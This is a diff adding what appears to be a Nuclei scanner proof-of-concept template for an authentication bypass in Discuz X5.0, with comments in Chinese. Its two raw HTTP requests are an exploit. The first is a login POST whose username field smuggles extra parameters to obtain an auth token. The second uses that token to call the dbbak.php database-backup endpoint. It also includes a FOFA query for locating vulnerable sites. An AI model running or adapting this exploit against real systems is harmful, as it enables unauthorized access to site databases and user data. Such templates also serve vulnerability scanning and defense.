@@ -1,0 +1,39 @@
+id: poc-pk0er79zbsxhfrea
+info:
+  name: Discuz X5.0 member存在认证绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pk0er79zbsxhfrea'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pk0er79zbsxhfrea
+    fofa: app="Discuz!" and app.version=="X5.0"
+http:
+- raw:
+  - 'POST /member.php?mod=logging&action=login&loginsubmit=yes HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 69
+
+
+    username=method%3Dexport%26time%3D9999999999%26&password=1&lssubmit=1
+
+    响应包搜索&auth'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /api/db/dbbak.php?apptype=discuzx&code=将获取到的auth填入发起请求 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
